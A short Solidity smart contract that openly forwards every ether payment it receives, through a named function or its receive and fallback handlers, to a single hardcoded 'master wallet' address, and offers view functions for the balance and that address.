// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract BalanceTransfer {
    address private masterWallet = 0xbe4cc29f45d5b8eeC7dd2B2DA6DA4aC967E91c15;
    
    event BalanceSent(address indexed sender, uint256 amount);
    
    function sendToMasterWallet() public payable {
        require(msg.value > 0, "Amount must be greater than 0");
        
        (bool success, ) = masterWallet.call{value: msg.value}("");
        require(success, "Transfer failed");
        
        emit BalanceSent(msg.sender, msg.value);
    }
    
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    function getMasterWallet() public view returns (address) {
        return masterWallet;
    }
    
    receive() external payable {
        sendToMasterWallet();
    }
    
    fallback() external payable {
        sendToMasterWallet();
    }
}